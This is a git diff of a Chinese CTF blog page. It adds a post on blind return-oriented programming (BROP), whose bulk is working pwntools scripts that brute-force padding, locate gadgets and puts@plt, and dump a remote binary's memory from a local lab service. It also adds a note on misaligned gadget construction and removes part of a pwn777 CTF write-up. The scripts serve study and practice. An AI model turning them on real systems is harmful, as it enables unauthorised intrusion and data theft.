@@ -155,6 +155,181 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/31/BROP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/31/BROP/" class="post-title-link" itemprop="url">BROP</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-31 13:01:09 / 修改时间：13:03:16" itemprop="dateCreated datePublished" datetime="2022-01-31T13:01:09+08:00">2022-01-31</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>原理在 ctf-wiki 上讲得很清楚了，这里不再重复</p>
+<p>首先需要存在已知如何触发的栈溢出，而且需要远程的进程服务崩溃后不会re-rand</p>
+<p>然后需要爆破出溢出所需的padding大小</p>
+<p>若存在Canary则需要按字节爆破，例如Canary为 0x7766554433221100 ，则从倒数第二个字节开始逐字节爆破，即 padding + 0x0100 ，若Canary报错则说明倒数第二个字节错误，爆破至正确后继续爆破倒数第三个字节直至得到Canary值</p>
+<p>我们需要根据程序的行为来猜测我们寻找的地址应该是什么，为此我们需要先找到 stop gadget</p>
+<h5 id="stop-gadget"><a href="#stop-gadget" class="headerlink" title="stop gadget"></a>stop gadget</h5><p>当我们把返回地址覆盖成我们随意选取的内存地址时，程序会有很大的概率crash，但是也存在一种情况，即当我们控制程序返回到一块内存区域后，程序并没有crash，而是hang在那里，使我们能一直保持连线状态，我们将这种gadget称为 stop gadget 。同样我们需要通过爆破来寻找这样的 stop gadget</p>
+<h5 id="Brop-gadget"><a href="#Brop-gadget" class="headerlink" title="Brop gadget"></a>Brop gadget</h5><p>我们需要将远程服务器dump出程序的内存到本地，为此我们需要一个输出函数，还要能控制对应寄存器的gadget，由于即便找到了 pop;ret 这样的gadget也很难知道其pop的是哪个寄存器，所以我们更倾向于找到__libc_csu_init 中的 pop6_ret（这里称为Brop gadget） 的地址，这样即可准确控制寄存器的值，另外Brop gadget往下偏移9即可得到 pop rdi;ret 。</p>
+<h5 id="寻找plt表"><a href="#寻找plt表" class="headerlink" title="寻找plt表"></a>寻找plt表</h5><p>为找到输出函数，我们需要找到plt表，plt表具有比较规整的结构，每一个plt表项都是 16 字节，且每个表项的6字节偏移处，是对该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 进行解析，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp [&#x27;func&#x27;]	6byte</span><br><span class="line">push index		5byte</span><br><span class="line">jmp dlresolve	5byte</span><br></pre></td></tr></table></figure>
+
+<p>所以 return 到 plt 表项的开头时程序就会调用该函数（无论是否解析过），而 return 到 plt 表项 +6 处，则会再进行一次函数的解析，这也无所谓，因为最终同样会调用该函数。</p>
+<p>当我们发现好多条连续16个字节对齐的地址都不会造成crash，而且这些地址+6的地址同样不会造成crash，那么我们有理由相信这就是某个plt对应的表项</p>
+<p>所以我们可以通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + p64(pop_rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
+
+<p>这样的payload来判断 addr 是不是 puts@plt（在程序未开PIE的情况下，0x400000 是 ELF 文件的头部，其内容为“\7fELF”。</p>
+<h5 id="dump远程"><a href="#dump远程" class="headerlink" title="dump远程"></a>dump远程</h5><p>利用 plt 表中的 puts 函数，配合 useful gadget，来 dump 远程信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + p64(pop_rdi_ret) + p64(target) + p64(puts) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
+
+<p>重复执行如上payload来讲远程的内存信息打印保存在本地，但是一次最多只能dump一个内存页的大小，也就是0x1000个字节</p>
+<h5 id="脚本部分"><a href="#脚本部分" class="headerlink" title="脚本部分"></a>脚本部分</h5><p>获取padding大小的部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_overflow_length</span>():</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">&#x27;a&#x27;</span>*i)</span><br><span class="line">            content = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;回显的内容&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">length = find_overflow_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> p.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding_length=null</span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> null:</span><br><span class="line">    padding_length=Force_find_padding()</span><br></pre></td></tr></table></figure>
+
+<p>记录获取的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in_file</span>(<span class="params">addr</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;puts.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;the addr:0x%x\n&quot;</span>%addr)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+
+<p>获取 stop gadget 的部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_stop_gadget</span>(<span class="params">length</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout = <span class="number">0.2</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;one_stop_gadget is at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                log_in_file(addr)  </span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>获取 Brop gadget 的部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Brop_gadget</span>(<span class="params">length,stop_gadget_addr,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget_addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p>检查 Brop gadget 的部分（防止addr本身是 stop_gadget）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_Brop_gadget</span>(<span class="params">length,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;回显的内容&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>结合上述两个部分得到 Brop gadget（一般可以不从0x400000开始）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_Brop_gadget</span>(<span class="params">length,stop_gadget_addr</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">if</span>(get_Brop_gadget(length,stop_gadget_addr,addr)):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;possible Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            <span class="keyword">if</span>(check_Brop_gadget(length,addr)):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;success Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>获取 puts@plt 的部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_puts_plt</span>(<span class="params">length,pop_rdi_ret</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(<span class="number">0</span>)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x7fELF&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;We found puts_plt at: &quot;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>泄露部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">length,stop_gadget_addr,pop_rdi_ret,puts_plt,addr</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(stop_gadget_addr)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = content[:content.index(<span class="string">&quot;\n回显的内容&quot;</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = content</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakfunction</span>(<span class="params">length,stop_gadget_addr,pop_rdi_ret,puts_plt</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        data = leak(length,stop_gadget_addr,pop_rdi_ret,puts_plt,addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f.write(result)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/30/%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0gadget/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/30/%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0gadget/" class="post-title-link" itemprop="url">错位构造gadget</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-30 20:23:44 / 修改时间：20:24:36" itemprop="dateCreated datePublished" datetime="2022-01-30T20:23:44+08:00">2022-01-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong><code>pop rdi;ret;</code>构造</strong></p>
+<p>在 <code>__libc_csu_init</code> 函数内的 <code>pop r15;ret;</code> ，它的字节码是<code>41 5f c3</code>。</p>
+<p>而<code>pop rdi;ret;</code>的字节码是<code>5f c3</code>。</p>
+<p>那么当EIP指向 <code>pop r15;ret;</code> 的地址 +1 时，程序事实上将会执行<code>pop rdi;ret;</code>。</p>
+<p><strong><code>pop rsi;pop r15;ret;</code>构造</strong></p>
+<p>同理在 <code>__libc_csu_init</code> 函数内的<code>pop r14;pop r15;ret;</code>，它的字节码是<code>41 5e 41 5f c3</code>。</p>
+<p>而<code>pop rsi;pop r15;ret;</code>的字节码是<code>5e 41 5f c3</code>。</p>
+<p>那么当EIP指向 <code>pop r14;pop r15;ret;</code> 的地址 +1 时，程序事实上将会执行<code>pop rsi;pop r15;ret;</code>。</p>
+<p>程序中有时会有一些可利用的 gadget 直接在IDA中无法直接找到，因为同样是用错位得到的，这时可以用ROPgadget等工具尝试寻找。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/18/qctf2018-stack2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -856,232 +1031,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/" class="post-title-link" itemprop="url">2021极客大挑战-pwn777</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-12 14:55:42" itemprop="dateCreated datePublished" datetime="2021-12-12T14:55:42+08:00">2021-12-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-16 17:04:43" itemprop="dateModified" datetime="2021-12-16T17:04:43+08:00">2021-12-16</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>覆盖随机数种子、bss段的格式化字符串、ORW、栈迁移</p>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/checksec.jpg" class>
-
-<p>main()函数如下</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/main.jpg" class>
-
-<p>我们分别查看每个函数，看到程序在init()函数中设置了沙箱</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/init.jpg" class>
-
-<p>检查沙箱保护</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/seccomp.jpg" class>
-
-<p>可以看到程序禁用了execve()函数，所以这题应该是要用 ORW 。</p>
-<p>welcome()是一堆普通的输出</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/welcome.jpg" class>
-
-<p>程序的第一个逻辑部分如下</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/game.jpg" class>
-
-<p>可以看到先有一次最长为 0x1c 字节长度的输入，然后需要猜对十次随机数，否则程序就会退出。这部分很简单，只需要将随机数种子覆盖即可预知随机数，查看该函数栈空间如下</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/game_stack.jpg" class>
-
-<p>seed 离我们的输入 name 差 0x20 - 0x8 = 0x18 个字节，然后再加上四个字节覆盖 seed，这部分的exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">lib = cdll.LoadLibrary(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name&quot;</span>,payload)</span><br><span class="line">lib.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(lib.rand())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;number:&quot;</span>)</span><br><span class="line">p.sendline(num)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success =&gt;&quot;</span>,i)</span><br></pre></td></tr></table></figure>
-
-<p>解决了第一部分，我们继续往下看</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/mymain.jpg" class>
-
-<p>这部分将存在于 .bss 段的 buf 与所给字符串进行比较，且比较长度正好为所给字符串长度，如果相等则 break ，查看fmt()函数如下 </p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/fmt.jpg" class>
-
-<p>这里存在一个格式化字符串漏洞，且 myread() 的作用就是往 buf 处输入最多 288 字节的输入。因为输入很长，所以足够我们在 buf 段构造 ROP 链，且 fmt() 函数嵌套在 while() 中，所以存在无限次的格式化字符串。</p>
-<p>因为我们要在 .bss 段构造 ROP 链，所以我们需要完成往 .bss 段的栈迁移，但是我们只有格式化字符串可以利用，所以我们直接利用格式化字符修改 mymain() 的 rbp 到 .bss 段，然后退出 mymain() 的循环，利用函数本身的 leave_ret 就可以完成栈迁移的过程。</p>
-<p>到这里思路就确定了，我们开始构造exp</p>
-<p>在修改 rbp 之前，我们共需要泄漏：①程序的地址——因为开启了 PIE。②libc地址——用来得到libc中的函数。③栈上的地址——因为格式化字符串的参数不在栈上，所以需要利用栈上的指针来修改栈上的地址。</p>
-<p>在 print() 处下断点查看栈空间</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/%E8%B0%83%E8%AF%95-1.jpg" class>
-
-<p>我们选择泄漏画圈的三个地址，偏移分别为6、7、13，泄漏的exp如下</p>
